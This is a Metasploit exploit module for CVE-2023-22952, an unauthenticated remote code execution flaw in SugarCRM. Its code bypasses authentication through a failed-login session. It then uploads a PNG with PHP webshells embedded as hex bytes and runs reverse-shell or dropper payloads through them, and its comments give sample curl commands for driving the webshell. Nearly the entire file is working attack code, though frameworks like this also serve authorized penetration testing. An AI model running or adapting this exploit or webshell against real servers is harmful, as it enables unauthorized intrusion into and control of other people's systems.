##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'securerandom'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper

  # PNG embedded tiny PHP webshell hidden in a PLTE chunk thats allows PHP command functions such as;
  # passthru(),shell_exec(), exec() and system() as options for command execution.
  #
  # PHP Code: <?=$_GET[0](base64_decode($_POST[1]));?>
  # Examples:
  # echo -n 'ls -l' | base64 ==> bHMgLWw=
  # curl -XPOST -d '1=bHMgLWw=' 'http://localhost/webshell_cmd_base64.phar?0=passthru' -o -
  # curl -XPOST -d '1=bHMgLWw=' 'http://localhost/webshell_cmd_base64.phar?0=system' -o -
  # curl -XPOST -d '1=bHMgLWw=' 'http://localhost/webshell_cmd_base64.phar?0=shell_exec' -o -
  PNG_CMD_WEBSHELL = "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52\x00\x00\x00\x0E"\
                     "\x00\x00\x00\x14\x04\x03\x00\x00\x00\x4F\x2B\x11\x1F\x00\x00\x00\x2A\x50\x4C\x54"\
                     "\x45\x3C\x3F\x3D\x24\x5F\x47\x45\x54\x5B\x30\x5D\x28\x62\x61\x73\x65\x36\x34\x5F"\
                     "\x64\x65\x63\x6F\x64\x65\x28\x24\x5F\x50\x4F\x53\x54\x5B\x31\x5D\x29\x29\x3B\x3F"\
                     "\x3E\x20\x20\x88\xDD\xEC\x6F\x00\x00\x00\x09\x70\x48\x59\x73\x00\x00\x0E\xC4\x00"\
                     "\x00\x0E\xC4\x01\x95\x2B\x0E\x1B\x00\x00\x00\x16\x49\x44\x41\x54\x08\x99\x63\x60"\
                     "\x80\x02\x46\x65\xD7\xF4\xCE\xD5\x67\x19\x06\x19\x00\x00\x9D\xCB\x02\xD2\x8E\xD6"\
                     "\x6C\x6F\x00\x00\x00\x00\x49\x45\x4E\x44\xAE\x42\x60\x82".freeze

  # PNG embedded tiny PHP webshell hidden in a PLTE chunk thats allows native PHP code execution using
  # the eval() function.
  #
  # PHP Code: <?php @eval(base64_decode($_POST[1]));?>
  # Examples:
  # echo -n "echo phpversion();" | base64 ==> ZWNobyBwaHB2ZXJzaW9uKCk7
  # curl -XPOST -d '1=ZWNobyBwaHB2ZXJzaW9uKCk7' 'http://localhost/webshell_php_base64.phar -o -
  PNG_PHP_WEBSHELL = "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52\x00\x00\x00\x0E"\
                     "\x00\x00\x00\x14\x04\x03\x00\x00\x00\x4F\x2B\x11\x1F\x00\x00\x00\x2A\x50\x4C\x54"\
                     "\x45\x3C\x3F\x70\x68\x70\x20\x40\x65\x76\x61\x6C\x28\x62\x61\x73\x65\x36\x34\x5F"\
                     "\x64\x65\x63\x6F\x64\x65\x28\x24\x5F\x50\x4F\x53\x54\x5B\x31\x5D\x29\x29\x3B\x3F"\
                     "\x3E\x20\x20\x34\x54\xE6\xA1\x00\x00\x00\x09\x70\x48\x59\x73\x00\x00\x0E\xC4\x00"\
                     "\x00\x0E\xC4\x01\x95\x2B\x0E\x1B\x00\x00\x00\x16\x49\x44\x41\x54\x08\x99\x63\x60"\
                     "\x80\x02\x46\x65\xD7\xF4\xCE\xD5\x67\x19\x06\x19\x00\x00\x9D\xCB\x02\xD2\x8E\xD6"\
                     "\x6C\x6F\x00\x00\x00\x00\x49\x45\x4E\x44\xAE\x42\x60\x82".freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SugarCRM unauthenticated Remote Code Execution (RCE)',
        'Description' => %q{
          This module exploits a Remote Code Execution (RCE) vulnerability that has been identified in the SugarCRM application.
          The vulnerability in sugarCRM could allows an unauthenticated attacker to upload a malicious PNG file with embedded PHP code to
          the /cache/images/ directory on the web server using the vulnerable endpoint /index.php?module=EmailTemplates&action=AttachFiles.
          Once uploaded to the server, depending on server configuration, the attacker can access the malicious PNG file via HTTP or HTTPS,
          thereby executing the malicious PHP code and gaining access to the system.

          The RCE is unauthenticated because of a missing authentication check in the loadUser() method in include/MVC/SugarApplication.php.
          After a failed login, the session does not get destroyed and hence the attacker can continue to send valid requests to the application.
          Any user privileges can exploit this vulnerability and it results in access to the underlying operating system with the same privileges
          under which the web services run (typically user www-data).
           
          SugarCRM 11.0 Professional, Enterprise, Ultimate, Sell and Serve versions 11.0.4 and below are affected. Fixed in release 11.0.5 
          SugarCRM 12.0 Enterprise, Sell and Serve versions 12.0.1 and below are affected. Fixed in release 12.0.2.
        },
        'Author' => [
          'Sw33t.0day', # discovery
          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # Metasploit module
        ],
        'References' => [
          [ 'CVE', '2023-22952' ],
          [ 'URL', 'https://seclists.org/fulldisclosure/2022/Dec/31' ],
          [ 'URL', 'https://support.sugarcrm.com/Resources/Security/sugarcrm-sa-2023-001/' ],
          [ 'URL', 'https://sugarclub.sugarcrm.com/engage/b/sugar-news/posts/jan-5-2023-security-vulnerability-update' ],
          [ 'URL', 'https://attackerkb.com/topics/E486ui94II/cve-2023-22952' ],
          [ 'PACKETSTORM', '170346' ]
        ],
        'License' => MSF_LICENSE,
        'Platform' => [ 'unix', 'linux', 'php' ],
        'Privileged' => false,
        'Arch' => [ ARCH_CMD, ARCH_PHP, ARCH_X64, ARCH_X86 ],
        'Targets' => [
          [
            'PHP',
            {
              'Platform' => 'php',
              'Arch' => ARCH_PHP,
              'Type' => :php,
              'DefaultOptions' => {
                'PAYLOAD' => 'php/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ ARCH_X64, ARCH_X86 ],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => [ 'wget', 'curl', 'printf', 'bourne' ],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2022-12-28',
        'DefaultOptions' => {
          'SSL' => false,
          'RPORT' => 80
        },
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ]
        }
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [ true, 'SugarCRM base url', '/' ]),
        OptString.new('WEBSHELL', [
          false, 'The name of the webshell with extension to trick the parser like .phtml, .phar, etc. Webshell name will be randomly generated if left unset.', nil
        ]),
        OptEnum.new('COMMAND', [ true, 'Use PHP command function', 'passthru', [ 'passthru', 'shell_exec', 'system', 'exec' ]], conditions: %w[TARGET != 0])
      ]
    )
  end

  def authenticate
    # generate PHP session-id
    @phpsessid = "PHPSESSID=#{SecureRandom.uuid}"

    # randomize user and password to obfuscate and make finger printing difficult.
    user_name = Rex::Text.rand_name
    user_password = Rex::Text.rand_text_alphanumeric(8..16)

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], 'index.php'),
      'cookie' => @phpsessid.to_s,
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'module' => 'Users',
        'action' => 'Authenticate',
        'user_name' => user_name.to_s,
        'user_password' => user_password.to_s
      }
    })
    if res && res.code == 500 && !res.body.blank?
      return true
    else
      return false
    end
  end

  def upload_webshell
    # randomize file name and extension if option WEBSHELL is not set
    file_ext = ['phar', 'phtml']
    if datastore['WEBSHELL'].blank?
      @webshell_name = "#{Rex::Text.rand_text_alpha(8..16)}.#{file_ext.sample}"
    else
      @webshell_name = datastore['WEBSHELL'].to_s
    end

    # select webshell depending on the target setting (PHP or others).
    if target['Type'] == :php
      png_webshell = PNG_PHP_WEBSHELL
    else
      png_webshell = PNG_CMD_WEBSHELL
    end

    # construct multipart form data based on Chrome browser fingerprint
    boundary = "----WebKitFormBoundary#{rand_text_alphanumeric(16)}"
    form_data = "--#{boundary}\r\n"
    form_data << "Content-Disposition: form-data; name=\"action\"\r\n"
    form_data << "\r\n"
    form_data << "AttachFiles\r\n"
    form_data << "--#{boundary}\r\n"
    form_data << "Content-Disposition: form-data; name=\"module\"\r\n"
    form_data << "\r\n"
    form_data << "EmailTemplates\r\n"
    form_data << "--#{boundary}\r\n"
    form_data << "Content-Disposition: form-data; name=\"file\"; filename=\"#{@webshell_name}\"\r\n"
    form_data << "Content-Type: image/png\r\n"
    form_data << "\r\n"
    form_data << png_webshell.to_s
    form_data << "\r\n"
    form_data << "--#{boundary}--\r\n"

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], 'index.php'),
      'cookie' => @phpsessid.to_s,
      'ctype' => "multipart/form-data; boundary=#{boundary}",
      'data' => form_data
    })
    if res && res.code == 200 && !res.body.blank? && res.body.include?(@webshell_name)
      return true
    else
      return false
    end
  end

  def execute_php(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    return send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], 'cache', 'images', @webshell_name),
      'cookie' => @phpsessid.to_s,
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        '1' => payload
      }
    })
  end

  def execute_command(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    php_cmd_function = datastore['COMMAND']
    return send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], 'cache', 'images', @webshell_name),
      'cookie' => @phpsessid.to_s,
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_get' => {
        '0' => php_cmd_function
      },
      'vars_post' => {
        '1' => payload
      }
    })
  end

  def exploit
    fail_with(Failure::NoAccess, 'Authentication bypass failed.') unless authenticate
    fail_with(Failure::NotVulnerable, "Webshell #{@webshell_name} upload failed, the system is likely patched.") unless upload_webshell
    register_file_for_cleanup(@webshell_name.to_s)

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :php
      execute_php(payload.encoded)
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager(linemax: 65536)
    end
  end
end
